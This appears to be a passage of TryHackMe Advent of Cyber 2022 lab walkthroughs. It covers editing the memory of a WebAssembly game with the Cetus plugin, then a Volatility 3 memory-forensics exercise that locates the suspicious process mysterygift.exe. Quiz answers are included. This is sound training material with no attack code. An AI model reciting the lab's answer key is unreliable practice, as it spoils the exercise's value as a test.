+Be sure to hit the **Start Machine** button before continuing. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. All you need for this challenge is available in the deployable machine. If you prefer to do so, however, you can download and install Cetus on your own machine by downloading it [from here](https://github.com/Qwokka/Cetus/releases/download/v1.03.1/Cetus_v1.03.1.zip).
+The Mighty Cetus
+Cetus is a simple browser plugin that works for Firefox and Chrome, allowing you to explore the memory space of Web Assembly games that run in your browser. The main idea behind it is to provide you with the tools to easily find any piece of data stored in memory and modify it if needed. On top of that, it will let you modify a game's compiled code and alter its behaviours if you want, although we won't need to go that deep for this task.
+Cetus is already installed on Chrome in your deployed machine, so you can use it straight away for the rest of the task. If you find the game runs slowly when using the in-browser machine, you can always install Cetus on your machine and do the task from there, following the indications given below.
+_Installing Cetus on Firefox (Click to read)_
+_Installing Cetus on Chrome (Click to read)_
+Accessing Cetus
+To open the game, go to your deployed machine and click the "Save Elf McSkidy" icon on the desktop. This will open Google Chrome with Cetus already loaded for you.
+To find Cetus, you need to open the `Developer tools` by clicking the button on the upper-right corner of Chrome, as shown in the figure below:
+Cetus is located in one of the tabs there:
+With Cetus open, hit the refresh button to reload the game. If you installed Cetus on your machine, you can find the game at [https://10.10.117.214/](https://10.10.117.214/). Cetus should detect the web assembly game running and show you the available tools:
+**Note:** If Cetus shows the "Waiting for WASM" message, just reload the game, and the tools should load.
+Guess the Guard's Number
+If you walk around the game, you will find that the guard won't let you leave unless you guess a randomly generated number. At some point, the game must store this number in memory. Cetus will allow us to pinpoint the random number's memory address quickly.
+As a first step, talk to the guard and try to guess the number randomly. You probably won't guess it first try, but take note of the guard's number.
+You can use Cetus to find all the memory addresses used by the game that match the given value. In this case, the guard's number is probably a regular integer, so we choose `i32` (32-bit integer) in Value Type.
+Cetus also allows you to search for numbers with decimals (usually called floats), represented by the `f32` and `f64` types, and for strings encoded in `ascii`, `utf-8` or `bytes`. You need to specify the data type as part of your search because, for your computer, the values `32` (integer) and `32.0` (float) are stored in different formats in memory.
+We will use the `EQ` comparison operator, which will search for memory addresses which content is equal to the value we input. Note that you can also search values using any of the other available operators. For reference, this is what other operators do:
+**Operator**
+**Description**
+EQ
+Find all memory addresses with contents that are **equal** to our inputted value.
+NE
+Find all memory addresses with contents that are **not equal** to our inputted value.
+LT
+Find all memory addresses with contents that are **lower than** our inputted value.
+GT
+Find all memory addresses with contents that are **greater than** our inputted value.
+LTE
+Find all memory addresses with contents that are **lower than or equal to** our inputted value.
+GTE
+Find all memory addresses with contents that are **greater than or equal** to our inputted value.
+Since the guard uses a random number, you will likely find the memory address on the first try. Once you do, click the bookmark button on the right of the memory address:
+You can then go to bookmarks to see your memory addresses:
+Note that Cetus uses hexadecimal notation to show you the numbers. If you need to convert the shown numbers to decimal, you can use [this website](https://www.rapidtables.com/convert/number/hex-to-decimal.html).
+With Cetus on the bookmarks tab, talk to the guard again and notice how the random number changes immediately. You can now guess the number:
+Convert the number from hexadecimal to get the guard's number (0x005c9d35 = 6069557). You defeated the guard (sort of)!
+**Note:** You can also modify the memory address containing the random number from the bookmarks tab. Try restarting the game and changing the guard's number right before the guard asks you for your number. You should now be able to change the guard's number at will!
+Getting through the bridge
+You are now out of your cell, but you still have to overcome some obstacles. Can you figure out how?
+While you are wondering what other data in memory could be changed to survive the bridge, Elf Recon McRed tells you that he read about **differential search**. Differential Search, he said, allows you to run successive searches in tandem, where each search will be scoped over the results of the last search only instead of the whole memory space. Elf Recon thinks this might be of help somehow.
+To help you better understand, he used the following example: suppose you want to find an address in memory, but you are not sure of the exact value it contains, but you can, however, manipulate it somehow by doing some actions in the game (you could manipulate the value of your position by moving, for example). Instead of doing a direct search by value as before, you can use differential search to look for memory positions based on specific **variations on the value**, rather than the value itself.
+To start the differential search mode, your first search needs to be done with an empty value.
+This will return the total number of memory addresses mapped by the game, which is `458753` in the image above. Now, suppose you want to know which memory addresses have decreased since the last search. You can run a second search using the `LT` operator without setting a value to search:
+The result above tells us that only `44` memory positions of the total of `458753` have decreased in value since the last search. You can of course, continue to do successive searches. For example, if you now wanted to know which of the `44` resulting memory addresses from the first search have increased their value, you could simply do another search with the `GT` operator with no value again.
+The result tells us that from the `44` memory addressed from the last search, only `26` have increased in value. If you are searching for a particular value, you can continue to do more searches until you find the memory address you are trying to get.
+Armed with this knowledge, can you identify any parameters you'd like to search on memory to allow you to cross the bridge? The elves surely hope you do, as getting McSkidy out of the game now depends on you!
+Answer the questions below
+What is the Guard's flag?
+**
+What is the Yeti's flag?
+Read what Elf McSkidy says after dying. There's a big hint there!
+**
+If you liked today's challenge, the [Walking an Application](https://tryhackme.com/room/walkinganapplication) room is an excellent follow-up!
+### [Day 11] Memory Forensics Not all gifts are nice
+The Story
+![an illustration depicting a wreath with ornaments](https://assets.tryhackme.com/additional/aoc2022/day11/banner.png)
+Check out SecurityNinja's video walkthrough for Day 11 [here](https://www.youtube.com/watch?v=RsJR2z_agiY)!
+The elves in Santa's Security Operations Centre (SSOC) are hard at work checking their monitoring dashboards when Elf McDave, one of the workshop employees, knocks on the door. The elf says, _"I've just clicked on something and now my workstation is behaving in all kinds of weird ways. Can you take a look?"._
+Elf McSkidy tasks you, Elf McBlue, to investigate the workstation. Running down to the workshop floor, you see a command prompt running some code. Uh oh! This is not good. You immediately create a memory dump of the workstation and place this dump onto your employee-issued USB stick, returning to the SSOC for further analysis.
+_You plug the USB into your workstation and begin your investigation._
+Memory forensics is the analysis of the volatile memory that is in use when a computer is powered on. Computers use dedicated storage devices called Random Access Memory (RAM) to remember what is being performed on the computer at the time. RAM is extremely quick and is the preferred method of storing and accessing data. However, it is limited compared to storage devices such as hard drives. This type of data is volatile because it will be deleted when the computer is powered off. RAM stores data such as your clipboard or unsaved files.
+We can analyse a computer's memory to see what applications (processes), what network connections were being made, and many more useful pieces of information. For example, we can analyse the memory of a computer infected with malware to see what the malware was doing at the time.
+Let's think about cooking. You normally store all of your food in the fridge - a hard drive is this fridge. When you are cooking, you will store ingredients on the kitchen counter so that you can quickly access them, but the kitchen counter (RAM) is much smaller than a fridge (hard drive)
+Memory forensics is an extremely important element when investigating a computer. A memory dump is a full capture of what was happening on the Computer at the time, for example, network connections or things running in the background. Most of the time, malicious code attempts to hide from the user. However, it cannot hide from memory.
+We can use this capture of the memory for analysis at a later date, especially as the memory on the computer will eventually be lost (if, for example, we power off the computer to prevent malware from spreading). By analysing the memory, we can discover exactly what the malware was doing, who it was contacting, and such forth.
+An Introduction to Processes
+At the simplest, a process is a running program. For example, a process is created when running an instance of notepad. You can have multiple processes for an application (for example, running three instances of notepad will create three processes). This is important to know because being able to determine what processes were running on the computer will tell us what applications were running at the time of the capture.
+On Windows, we can use Task Manager_(pictured below)_ to view and manage the processes running on the computer.
+_Window's Task Manager_
+On a computer, processes are usually categorised into two groups:
+**Category**
+**Description**
+**Example**
+User Process
+These processes are programs that the user has launched. For example, text editors, web browsers, etc.
+notepad.exe - this is a text editor that is launched by the user.
+Background Process
+These processes are automatically launched and managed by the Operating System and are often essential to the Operating System behaving correctly.
+dwm.exe - this is an essential process for Windows that is responsible for displaying windows and applications on the computer.
+Introducing Volatility
+Volatility is an open-source memory forensics toolkit written in Python. Volatility allows us to analyse memory dumps taken from Windows, Linux and Mac OS devices and is an extremely popular tool in memory forensics. For example, Volatility allows us to:
+-   List all processes that were running on the device at the time of the capture
+-   List active and closed network connections
+-   Use Yara rules to search for indicators of malware
+-   Retrieve hashed passwords, clipboard contents, and contents of the command prompt
+-   And much, much more!
+Once Volatility and its requirements (i.e. Python) are installed, Volatility can be run using `python3 vol.py`. The terminal below displays Volatility's help menu:
+Displaying Volatility's help menu
+```shell-session
+cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -h
+Volatility 3 Framework 2.4.1
+usage: volatility [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]] [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG] [-o OUTPUT_DIR] [-q]
+                  [-r RENDERER] [-f FILE] [--write-config] [--save-config SAVE_CONFIG] [--clear-cache] [--cache-path CACHE_PATH] [--offline]
+                  [--single-location SINGLE_LOCATION] [--stackers [STACKERS [STACKERS ...]]]
+                  [--single-swap-locations [SINGLE_SWAP_LOCATIONS [SINGLE_SWAP_LOCATIONS ...]]]
+                  plugin ...
+
+An open-source memory forensics framework
+
+optional arguments:
+  -h, --help            Show this help message and exit, for specific plugin options use 'volatility  --help'
+  -c CONFIG, --config CONFIG
+  --cropped for brevity--
+```
+Today's task will cover Volatility 3, which was initially released in 2020 to replace the deprecated Volatility 2 framework.  Volatility requires  a few arguments to run:
+-   Calling the Volatility tool via `python3 vol.py`
+-   Any options such as the name and location of the memory dump
+-   The action you want to perform (I.e. what plugins you want to use - we'll come onto these shortly!)
+Some common options and examples that you may wish to provide to Volatility are located in the table below:
+Option
+Description
+Example
+-f
+This argument is where you provide the name and location of the memory dump that you wish to analyse.
+`python3 vol.py -f /path/to/my/memorydump.vmem`
+-v
+This argument increases the verbosity of Volatility. This is sometimes useful to understand what Volatility is doing in cases of debugging.
+`python3 vol.py -v`
+-p
+This argument allows you to override the default location of where plugins are stored.
+`python3 vol.py -p /path/to/my/custom/plugins`
+-o
+This argument allows you to specify where extracted processes or DLLs are stored.
+`python3 vol.py -o /output/extracted/files/here`
+And finally, now we need to decide what we want to analyse the image for. Volatility uses plugins to perform analysis, such as:
+-   Listing processes
+-   Listing network connections
+-   Listing contents of the clipboard, notepad, or command prompt
+-   And much more! If you're curious, you can read the documentation [here](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html)
+In this task, we are going to use Volatility to:
+1.  See what Operating System the memory dump is from
+2.  See what processes were running at the time of capture
+3.  See what connections were being made at the time of capture
+Using Volatility to Analyse an Image
+Before proceeding with our analysis, we need to confirm the Operating System of the device that the memory has been captured from. We need to confirm this because it will determine what plugins we can use in our investigation.
+First, let's use the `imageinfo` plugin to analyse our memory dump file to determine the Operating System. To do this, we need to use the following command (remembering to include our memory dump by using the `-f` option): `python3 vol.py -f workstation.vmem windows.info`.
+_Note: This can sometimes take a couple of minutes, depending on the size of the memory dump and the hardware of the system running the scan._
+Using Volatility to gather some information about the memory dump
+```shell-session
+cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.info
+Volatility 3 Framework 2.4.1
+Progress:  100.00   PDB scanning finished
+Variable  Value
+
+Kernel Base 0xf803218a8000
+DTB 0x1ad000
+Symbols file:///home/ubuntu/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/E0093F3AEF15D58168B753C9488A4043-1.json.xz
+Is64Bit True
+IsPAE False
+layer_name  0 WindowsIntel32e
+memory_layer  1 FileLayer
+KdVersionBlock  0xf80321cd23c8
+Major/Minor 15.18362
+MachineType 34404
+KeNumberProcessors  4
+SystemTime  
+NtSystemRoot  C:\Windows
+NtProductType NtProductWinNt
+NtMajorVersion  10
+NtMinorVersion  0
+PE MajorOperatingSystemVersion  10
+PE MinorOperatingSystemVersion  0
+PE Machine  34404
+PE TimeDateStamp  Mon Apr 14 21:36:50 2104
+ubuntu@aoc2022-day-11:~/volatility3$
+```
+Great! We can see that Volatility has confirmed that the Operating System is Windows. With this information, we now know we need to use the Windows sub-set of plugins with Volatility. The plugins that are going to be used in today's task are detailed in the table below:
+Plugin
+Description
+Objective
+windows.pslist
+This plugin lists all of the processes that were running at the time of the capture.
+To discover what processes were running on the system.
+windows.psscan
+This plugin allows us to analyse a specific process further.
+To discover what a specific process was actually doing.
+windows.dumpfiles
+This plugin allows us to export the process, where we can perform further analysis (i.e. static or dynamic analysis).
+To export a specific binary that allows us further to analyse it through static or dynamic analysis.
+windows.netstat
+This plugin lists all network connections at the time of the capture.
+To understand what connections were being made. For example, was a process causing the computer to connect to a malicious server? We can use this IP address to implement defensive measures on other devices. For example, if we know an IP address is malicious, and another device is communicating with it, then we know that device is also infected.
+_Please note that this is not all of the possible plugins. An extensive list of the Windows sub-set of plugins can be found [here](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.windows.html)._
+Showing These Plugins in Use
+windows.pslist
+`python3 vol.py -f workstation.vmem windows.pslist`
+Using windows.pslist
+```shell-session
+ubuntu@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.pslist
+Volatility 3 Framework 2.4.1
+Progress:  100.00   PDB scanning finished
+PID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output
+
+4 0 System  0xc0090b286040  141 - N/A False .000000  N/A Disabled
+104 4 Registry  0xc0090b2dd080  4 - N/A False .000000  N/A Disabled
+316 4 smss.exe  0xc0090e438400  2 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
+436 428 csrss.exe 0xc0090ea65140  10  - 0 False 2022-11-23 09:43:18.000000  N/A Disabled
+512 504 csrss.exe 0xc0090f35e140  12  - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
+536 428 wininit.exe 0xc0090f2c0080  1 - 0 False 2022-11-23 09:43:19.000000  N/A Disabled
+584 504 winlogon.exe  0xc0090f383080  3 - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
+656 536 services.exe  0xc0090e532340  5 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
+680 536 lsass.exe 0xc0090f3a5080  6 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
+792 656 svchost.exe 0xc0090fa33240  12  - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
+820 536 fontdrvhost.ex  0xc0090f3a3140  5 - 0 False .000000  N/A Disabled
+828 584 fontdrvhost.ex  0xc0090fa39140  5 - 1 False .000000  N/A Disabled
+916 656 svchost.exe 0xc0090fad72c0  7 - 0 False 2022-11-23 09:43:23.000000  N/A Disabled
+1000  584 dwm.exe 0xc0090fb0b080  13  - 1 False 2022-11-23 09:43:24.000000  N/A Disabled
+380 656 svchost.exe 0xc0090fba9240  41  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled
+420 656 svchost.exe 0xc0090fbbf280  15  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled
+1116  656 svchost.exe 0xc0090fc2e2c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
+1124  656 svchost.exe 0xc0090fc302c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
+1204  656 svchost.exe 0xc0090fc2a080  19  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
+1256  4 MemCompression  0xc0090fa35040  34  - N/A False .000000  N/A Disabled
+1292  656 svchost.exe 0xc0090fc752c0  2 - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
+1436  656 svchost.exe 0xc0090fdb52c0  7 - 0 False 2022-11-23 09:43:28.000000  N/A Disabled
+--cropped for brevity--
+```
+windows.psscan
+`python3 vol.py -f workstation.vmem windows.psscan`
+Using windows.pscan
+```shell-session
+cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.psscan
+Volatility 3 Framework 2.4.1
+Progress:  100.00   PDB scanning finished
+PID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output
+
+4 0 System  0xc0090b286040  141 - N/A False .000000  N/A Disabled
+104 4 Registry  0xc0090b2dd080  4 - N/A False .000000  N/A Disabled
+2528  2108  vm3dservice.ex  0xc0090b303080  2 - 1 False .000000  N/A Disabled
+2440  656 svchost.exe 0xc0090b336080  11  - 0 False 2022-11-23 09:43:37.000000  N/A Disabled
+6584  792 ApplicationFra  0xc0090b375080  2 - 1 False .000000  N/A Disabled
+1048  656 SecurityHealth  0xc0090b39e080  9 - 0 False .000000  N/A Disabled
+1928  4064  cmd.exe 0xc0090b3a84c0  1 - 1 False 2022-11-23 09:59:09.000000  N/A Disabled
+2040  5888  mysterygift.ex  0xc0090b52e4c0  3 - 1 False .000000  N/A Disabled
+316 4 smss.exe  0xc0090e438400  2 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
+656 536 services.exe  0xc0090e532340  5 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
+436 428 csrss.exe 0xc0090ea65140  10  - 0 False 2022-11-23 09:43:18.000000  N/A Disabled
+536 428 wininit.exe 0xc0090f2c0080  1 - 0 False 2022-11-23 09:43:19.000000  N/A Disabled
+512 504 csrss.exe 0xc0090f35e140  12  - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
+584 504 winlogon.exe  0xc0090f383080  3 - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
+820 536 fontdrvhost.ex  0xc0090f3a3140  5 - 0 False .000000  N/A Disabled
+680 536 lsass.exe 0xc0090f3a5080  6 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
+792 656 svchost.exe 0xc0090fa33240  12  - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
+1256  4 MemCompression  0xc0090fa35040  34  - N/A False .000000  N/A Disabled
+828 584 fontdrvhost.ex  0xc0090fa39140  5 - 1 False .000000  N/A Disabled
+916 656 svchost.exe 0xc0090fad72c0  7 - 0 False 2022-11-23 09:43:23.000000  N/A Disabled
+--cropped for brevity--
+```
+windows.dumpfiles
+`python3 vol.py -f workstation.vmem windows.dumpfiles`
+Using windows.dumpfiles
+```shell-session
+cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.dumpfiles --pid 4640
+Volatility 3 Framework 2.4.1
+Progress:  100.00   PDB scanning finished
+Cache FileObject  FileName  Result
+
+ImageSectionObject  0xc00910256a80  WinStore.App.exe  dumping file
+DataSectionObject 0xc0090fc4bae0  ~FontCache-FontFace.dat dumping file
+ImageSectionObject  0xc00911d3f740  Windows.UI.Xaml.winmd dumping file
+DataSectionObject 0xc00910d27210  ~FontCache-S-1-5-21-4089795901-3714076801-2393801563-1000.dat dumping file
+ImageSectionObject  0xc0091491f6a0  Windows.UI.Xaml.Resources.rs5.dll dumping file
+ImageSectionObject  0xc0091123add0  Windows.ApplicationModel.winmd  dumping file
+--cropped for brevity--
+```
+To access the memory dump, you will need to deploy the machine attached to this task by pressing the green "Start Machine" button located at the top-right of this task. The machine should launch in a split-screen view. If it does not, you will need to press the blue "Show Split Screen" button near the top-right of this page.
+**_Volatility and the memory file (named workstation.vmem) is located in /home/elfmcblue/volatility3._**
+Answer the questions below
+What is the Windows version number that the memory image captured?
+_Note: this initial scan may take up towards 10 minutes to complete. Why not grab some water or stretch your legs?_
+You may wish to use windows.info for this.
+```text
+elfmcblue@aoc2022-day-11:~$ cd volatility3/
+elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.info
+Volatility 3 Framework 2.4.1
+Progress:  100.00PDB scanning finished                        
+VariableValue
+
+Kernel Base0xf803218a8000
+DTB0x1ad000
+Symbolsfile:///home/elfmcblue/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/E0093F3AEF15D58168B753C9488A4043-1.json.xz
+Is64BitTrue
+IsPAEFalse
+layer_name0 WindowsIntel32e
+memory_layer1 FileLayer
+KdVersionBlock0xf80321cd23c8
+Major/Minor15.18362
+MachineType34404
+KeNumberProcessors4
+SystemTime2022-11-23 10:15:56
+NtSystemRootC:\Windows
+NtProductTypeNtProductWinNt
+NtMajorVersion10
+NtMinorVersion0
+PE MajorOperatingSystemVersion10
+PE MinorOperatingSystemVersion0
+PE Machine34404
+PE TimeDateStampMon Apr 14 21:36:50 2104
+```
+*10*
+What is the name of the binary/gift that secret Santa left?
+You may wish to use windows.pslist for this.
+```text
+elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.pslist
+Volatility 3 Framework 2.4.1
+Progress:  100.00PDB scanning finished                        
+PIDPPIDImageFileNameOffset(V)ThreadsHandlesSessionIdWow64CreateTimeExitTimeFile output
+
+40System0xc0090b286040141-N/AFalse2022-11-23 09:43:13.000000 N/ADisabled
+1044Registry0xc0090b2dd0804-N/AFalse2022-11-23 09:43:04.000000 N/ADisabled
+3164smss.exe0xc0090e4384002-N/AFalse2022-11-23 09:43:13.000000 N/ADisabled
+436428csrss.exe0xc0090ea6514010-0False2022-11-23 09:43:18.000000 N/ADisabled
+512504csrss.exe0xc0090f35e14012-1False2022-11-23 09:43:19.000000 N/ADisabled
+536428wininit.exe0xc0090f2c00801-0False2022-11-23 09:43:19.000000 N/ADisabled
+584504winlogon.exe0xc0090f3830803-1False2022-11-23 09:43:19.000000 N/ADisabled
+656536services.exe0xc0090e5323405-0False2022-11-23 09:43:20.000000 N/ADisabled
+680536lsass.exe0xc0090f3a50806-0False2022-11-23 09:43:20.000000 N/ADisabled
+792656svchost.exe0xc0090fa3324012-0False2022-11-23 09:43:22.000000 N/ADisabled
+820536fontdrvhost.ex0xc0090f3a31405-0False2022-11-23 09:43:22.000000 N/ADisabled
+828584fontdrvhost.ex0xc0090fa391405-1False2022-11-23 09:43:22.000000 N/ADisabled
+916656svchost.exe0xc0090fad72c07-0False2022-11-23 09:43:23.000000 N/ADisabled
+1000584dwm.exe0xc0090fb0b08013-1False2022-11-23 09:43:24.000000 N/ADisabled
+380656svchost.exe0xc0090fba924041-0False2022-11-23 09:43:25.000000 N/ADisabled
+420656svchost.exe0xc0090fbbf28015-0False2022-11-23 09:43:25.000000 N/ADisabled
+1116656svchost.exe0xc0090fc2e2c016-0False2022-11-23 09:43:26.000000 N/ADisabled
+1124656svchost.exe0xc0090fc302c016-0False2022-11-23 09:43:26.000000 N/ADisabled
+1204656svchost.exe0xc0090fc2a08019-0False2022-11-23 09:43:26.000000 N/ADisabled
+12564MemCompression0xc0090fa3504034-N/AFalse2022-11-23 09:43:26.000000 N/ADisabled
+1292656svchost.exe0xc0090fc752c02-0False2022-11-23 09:43:26.000000 N/ADisabled
+1436656svchost.exe0xc0090fdb52c07-0False2022-11-23 09:43:28.000000 N/ADisabled
+1536656svchost.exe0xc0090fdc42c017-0False2022-11-23 09:43:28.000000 N/ADisabled
+1576656svchost.exe0xc0090fdf32c04-0False2022-11-23 09:43:29.000000 N/ADisabled
+1584656svchost.exe0xc0090fdf52c03-0False2022-11-23 09:43:29.000000 N/ADisabled
+1656656svchost.exe0xc0090fe962402-0False2022-11-23 09:43:29.000000 N/ADisabled
+1708656spoolsv.exe0xc0090fea32007-0False2022-11-23 09:43:29.000000 N/ADisabled
+1816656svchost.exe0xc0090ff092c012-0False2022-11-23 09:43:30.000000 N/ADisabled
+2064656svchost.exe0xc009100ee24010-0False2022-11-23 09:43:34.000000 N/ADisabled
+2108656vm3dservice.ex0xc009100f12402-0False2022-11-23 09:43:34.000000 N/ADisabled
+2216656vmtoolsd.exe0xc0091030c28013-0False2022-11-23 09:43:35.000000 N/ADisabled
+2236656VGAuthService.0xc009100f30802-0False2022-11-23 09:43:35.000000 N/ADisabled
+2440656svchost.exe0xc0090b33608011-0False2022-11-23 09:43:37.000000 N/ADisabled
+25282108vm3dservice.ex0xc0090b3030802-1False2022-11-23 09:43:38.000000 N/ADisabled
+2984656dllhost.exe0xc0091045628010-0False2022-11-23 09:43:44.000000 N/ADisabled
+780656msdtc.exe0xc009105952809-0False2022-11-23 09:43:46.000000 N/ADisabled
+516792WmiPrvSE.exe0xc009105b928011-0False2022-11-23 09:43:53.000000 N/ADisabled
+3464380sihost.exe0xc009108252806-1False2022-11-23 09:43:59.000000 N/ADisabled
+3500656svchost.exe0xc0091070430011-1False2022-11-23 09:43:59.000000 N/ADisabled
+3540380taskhostw.exe0xc0091074a3008-1False2022-11-23 09:43:59.000000 N/ADisabled
+3724420ctfmon.exe0xc009107990809-1False2022-11-23 09:44:00.000000 N/ADisabled
+4040584userinit.exe0xc009109cb3400-1False2022-11-23 09:44:05.000000 2022-11-23 09:44:41.000
+000 Disabled
+40644040explorer.exe0xc009109cd40086-1False2022-11-23 09:44:05.000000 N/ADisabled
+4268656svchost.exe0xc00910cbd3005-1False2022-11-23 09:44:13.000000 N/ADisabled
+4816792StartMenuExper0xc00910e6a4c09-1False2022-11-23 09:44:21.000000 N/ADisabled
+4948792RuntimeBroker.0xc009110210802-1False2022-11-23 09:44:23.000000 N/ADisabled
+5052656SearchIndexer.0xc0091109d24016-0False2022-11-23 09:44:25.000000 N/ADisabled
+5096792SearchUI.exe0xc009110a108062-1False2022-11-23 09:44:25.000000 N/ADisabled
+5156792RuntimeBroker.0xc009115640809-1False2022-11-23 09:44:28.000000 N/ADisabled
+27604064SecurityHealth0xc00910fa83801-1False2022-11-23 09:44:45.000000 N/ADisabled
+1048656SecurityHealth0xc0090b39e0809-0False2022-11-23 09:44:46.000000 N/ADisabled
+21204064vmtoolsd.exe0xc0091134c3c09-1False2022-11-23 09:44:46.000000 N/ADisabled
+58684064msedge.exe0xc00910faa4c00-1False2022-11-23 09:44:46.000000 2022-11-23 09:58:15.000
+000 Disabled
+58924064OneDrive.exe0xc0091189a40025-1True2022-11-23 09:44:47.000000 N/ADisabled
+6416792dllhost.exe0xc009103904c05-1False2022-11-23 09:45:16.000000 N/ADisabled
+6772792SkypeApp.exe0xc00910dc40c042-1False2022-11-23 09:45:22.000000 N/ADisabled
+6924792SkypeBackgroun0xc009119492404-1False2022-11-23 09:45:22.000000 N/ADisabled
+3580792RuntimeBroker.0xc00910bd83001-1False2022-11-23 09:45:24.000000 N/ADisabled
+3912792RuntimeBroker.0xc00911c180801-1False2022-11-23 09:45:29.000000 N/ADisabled
+6828656svchost.exe0xc009100570808-0False2022-11-23 09:45:39.000000 N/ADisabled
+4244656SgrmBroker.exe0xc00911c290803-0False2022-11-23 09:45:49.000000 N/ADisabled
+4368656svchost.exe0xc00911e2d0809-0False2022-11-23 09:45:50.000000 N/ADisabled
+1524656svchost.exe0xc00911d690803-0False2022-11-23 09:45:59.000000 N/ADisabled
+5796792smartscreen.ex0xc009110e908011-1False2022-11-23 09:52:45.000000 N/ADisabled
+2272792WindowsInterna0xc00910e6f08015-1False2022-11-23 09:53:36.000000 N/ADisabled
+4600656svchost.exe0xc00910dd54804-0False2022-11-23 09:54:27.000000 N/ADisabled
+7000656MsMpEng.exe0xc0091044c08034-0False2022-11-23 09:54:37.000000 N/ADisabled
+49804064notepad.exe0xc00911a930801-1False2022-11-23 09:54:38.000000 N/ADisabled
+6572656NisSrv.exe0xc00911e2c0804-0False2022-11-23 09:54:44.000000 N/ADisabled
+58844064procexp64.exe0xc00910cb90804-1False2022-11-23 09:56:13.000000 N/ADisabled
+71285868msedge.exe0xc009127410c00-1False2022-11-23 09:58:15.000000 2022-11-23 10:01:54.000
+000 Disabled
+6584792ApplicationFra0xc0090b3750802-1False2022-11-23 09:58:58.000000 N/ADisabled
+1920792RuntimeBroker.0xc00911bd70801-1False2022-11-23 09:59:00.000000 N/ADisabled
+19284064cmd.exe0xc0090b3a84c01-1False2022-11-23 09:59:09.000000 N/ADisabled
+66041928conhost.exe0xc0091418d0804-1False2022-11-23 09:59:09.000000 N/ADisabled
+4640792WinStore.App.e0xc009141a24c011-1False2022-11-23 09:59:24.000000 N/ADisabled
+58884064cmd.exe0xc009118670801-1False2022-11-23 09:59:38.000000 N/ADisabled
+59325888conhost.exe0xc00911bbf0804-1False2022-11-23 09:59:38.000000 N/ADisabled
+6220792ShellExperienc0xc00911c4a4c014-1False2022-11-23 10:01:52.000000 N/ADisabled
+3944792RuntimeBroker.0xc009119954c01-1False2022-11-23 10:01:54.000000 N/ADisabled
+45607128msedge.exe0xc0091185d4c027-1False2022-11-23 10:01:54.000000 N/ADisabled
+52084560msedge.exe0xc0091275a4c07-1False2022-11-23 10:01:54.000000 N/ADisabled
+1924560msedge.exe0xc00911da74c013-1False2022-11-23 10:01:54.000000 N/ADisabled
+8044560msedge.exe0xc009142904c011-1False2022-11-23 10:01:54.000000 N/ADisabled
+55964560msedge.exe0xc009142934c07-1False2022-11-23 10:01:54.000000 N/ADisabled
+31081928python.exe0xc00911c2d4c02-1False2022-11-23 10:02:27.000000 N/ADisabled
+29605052SearchProtocol0xc0091275c4c06-0False2022-11-23 10:14:10.000000 N/ADisabled
+37805052SearchFilterHo0xc009105b50c04-0False2022-11-23 10:14:10.000000 N/ADisabled
+20405888mysterygift.ex0xc0090b52e4c03-1False2022-11-23 10:15:19.000000 N/ADisabled
+3885052SearchProtocol0xc00912bf24c07-1False2022-11-23 10:15:24.000000 N/ADisabled
+```
+*mysterygift.exe*
+What is the Process ID (PID) of this binary?
+You may wish to use windows.psscan for this.
+*2040*
+Dump the contents of this binary. How many files are dumped?
+You may wish to use windows.dumpfiles for this. Remember to include the Process ID (PID) of the binary (--pid NUMBER).
+```text
+elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040
+Volatility 3 Framework 2.4.1
+Progress:  100.00PDB scanning finished                        
+CacheFileObjectFileNameResult
+
+ImageSectionObject0xc00912e1f1f0mysterygift.exefile.0xc00912e1f1f0.0xc009119ab9b0.ImageSectionObject.mysterygift.exe.img
+ImageSectionObject0xc0090e8b9b50kernel32.dllfile.0xc0090e8b9b50.0xc0090bb58d70.ImageSectionObject.kernel32.dll.img
+ImageSectionObject0xc0090f3b7a50dnsapi.dllfile.0xc0090f3b7a50.0xc0090f3a4c40.ImageSectionObject.dnsapi.dll.img
+ImageSectionObject0xc0090fe50630FWPUCLNT.DLLfile.0xc0090fe50630.0xc0090fdb7c80.ImageSectionObject.FWPUCLNT.DLL.img
+ImageSectionObject0xc0090fe56bc0rasadhlp.dllfile.0xc0090fe56bc0.0xc0090ff8ed30.ImageSectionObject.rasadhlp.dll.img
+ImageSectionObject0xc0090f3b8d10IPHLPAPI.DLLfile.0xc0090f3b8d10.0xc0090f3d6010.ImageSectionObject.IPHLPAPI.DLL.img
